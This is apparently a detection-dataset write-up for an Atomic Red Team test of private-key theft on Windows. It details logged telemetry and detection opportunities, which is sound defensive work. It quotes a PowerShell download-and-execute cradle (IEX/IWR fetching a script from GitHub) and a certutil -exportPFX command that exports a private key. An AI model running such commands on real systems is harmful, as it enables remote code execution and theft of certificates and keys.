# T1552.004-11: Private Keys — CertUtil ExportPFX

## Technique Context

MITRE ATT&CK T1552.004 (Private Keys) includes exporting certificates and their associated private keys from the Windows certificate store. `certutil.exe` is a built-in Windows utility that can export certificates to PFX format (`-exportPFX`), including the private key, to a file that can be transferred off the system and used for authentication or decryption elsewhere. This technique is frequently used to steal code signing certificates, TLS private keys, smart card certificates, and CA certificates. Test 11 first installs a test root certificate using a PowerShell-based WMI script (fetched from the ART GitHub repository), then exports it using `certutil.exe -exportPFX`. The export fails (exit status 0x80070050 — "The file exists") but the attempt is fully captured.

## What This Dataset Contains

The dataset spans approximately nine seconds (00:30:45–00:30:54 UTC) and contains 182 events across five log sources.

**The full two-phase operation is captured.** Phase 1 installs a test certificate; Phase 2 attempts the export.

**Phase 1 — Certificate installation via WMI:**

PowerShell EID 4104 records the test framework command:
```
& {IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)
certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\temp\atomic.pfx}
```

EID 4103 records `Invoke-WebRequest` with the GitHub URL for `RemoteCertTrust.ps1`. The downloaded script is executed in memory; its actions appear in module logging as `Invoke-CimMethod` calls against `StdRegProv` with methods `CreateKey` and `SetBinaryValue`, writing a binary certificate blob to `HKLM\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\1F3D38F280635F275BE92B87CF83E40E40458400\Blob`.

Sysmon EID 13 (Registry value set) records this certificate installation with the full registry path and the Defender-specific rule tag `technique_id=T1553.004,technique_name=Install Root Certificate`.

Sysmon EID 22 (DNS query) records resolution of `raw.githubusercontent.com` (185.199.x.x). Sysmon EID 3 (Network connection) records two TCP connections from `powershell.exe` to GitHub (to download `RemoteCertTrust.ps1`) and one connection to `ACME-DC01.acme.local` for certutil's DC lookup.

**Phase 2 — CertUtil export attempt:**

Sysmon EID 1 records `certutil.exe` with `CommandLine: "C:\Windows\system32\certutil.exe" -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\temp\atomic.pfx` (tagged T1202, Indirect Command Execution).

Security EID 4689 records `certutil.exe` exiting with status `0x80070050` — "The file already exists." The export failed because `c:\temp\atomic.pfx` already existed from a prior test run. The certificate is present in the store (confirmed by the successful EID 13 registry write) but the PFX was not written in this execution.

Security log contains 4624/4627/4672 logon events (Type 3 — network logon) for ACME-WS02$ during the certutil execution, reflecting the machine account authenticating to the domain — likely during certificate chain validation.

The taskscheduler.jsonl (8 events) contains Windows Update Orchestrator scheduled task activity (EID 100/102/129/200/201) that fired coincidentally during the collection window. These are unrelated OS background activity.

The application.jsonl (1 event, EID 16394) is an unrelated Application log entry.

## What This Dataset Does Not Contain (and Why)

**No PFX file was written.** The exit code 0x80070050 indicates the output file path was occupied. An analyst cannot confirm from this data whether a PFX file with the private key was exfiltrated in this execution.

**No object access events for the certificate store.** Object access auditing is not enabled, so the actual read of the certificate private key material by `certutil.exe` is not captured.

**Phase 1 was a T1553.004 (Install Root Certificate) operation** — the installed certificate is a synthetic ART test artifact, not a real organizational certificate. In a real attack, the target certificate would already be in the store and Phase 1 would not exist.

## Assessment

This is the most event-rich dataset in the T1552.004 series (182 events, five log sources). It captures a realistic multi-step attack: fetch a setup script via HTTPS, install a target artifact via WMI/registry, then export it using a built-in LOLBin. The certutil failure due to file collision is a realistic artifact of sequential test execution in the same environment. The dataset is notable for demonstrating several distinct detection surfaces simultaneously: script block logging of the download cradle, WMI registry manipulation (EID 4103 CIM method calls), Sysmon registry set (EID 13), DNS and network connection events (EID 22, EID 3), and a certutil process launch with the `-exportPFX` flag. The domain logon events in the Security log provide additional correlation context for the certutil execution.

## Detection Opportunities Present in This Data

- **Sysmon EID 1 / Security EID 4688**: `certutil.exe` with `-exportPFX` in the command line is a high-confidence indicator. `certutil` has no routine administrative need to export private keys outside of PKI management workflows.
- **Sysmon EID 1 (T1202 tag)**: The Indirect Command Execution tag on certutil reflects its LOLBin status; certutil spawned from powershell.exe as SYSTEM is anomalous.
- **Sysmon EID 13**: Registry write to `HKLM\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\<thumbprint>\Blob` by any process other than standard Windows PKI components (certutil itself during normal enrollment, or the Certificate MMC snap-in) is suspicious. The T1553.004 rule tag fires here.
- **PowerShell EID 4103**: `Invoke-CimMethod` with `Namespace: root/default`, `ClassName: StdRegProv`, `MethodName: SetBinaryValue` writing to certificate store paths is the WMI-based certificate installation pattern.
- **PowerShell EID 4103**: `Invoke-WebRequest` fetching a `.ps1` file from `raw.githubusercontent.com` followed by `Invoke-Expression` is a download-and-execute cradle.
- **Sysmon EID 22 + 3**: DNS resolution of `raw.githubusercontent.com` followed by TCP connection from `powershell.exe` as SYSTEM.
- **Security EID 4648**: Explicit credential logon during certutil execution (network Type 3 logon) — certutil contacting the CA or DC during export operations may produce this.
- **Exit code 0x80070050**: In Security EID 4689, this exit code on certutil after `-exportPFX` indicates a file collision rather than a permissions block, suggesting prior successful execution or artifact from a previous attempt.
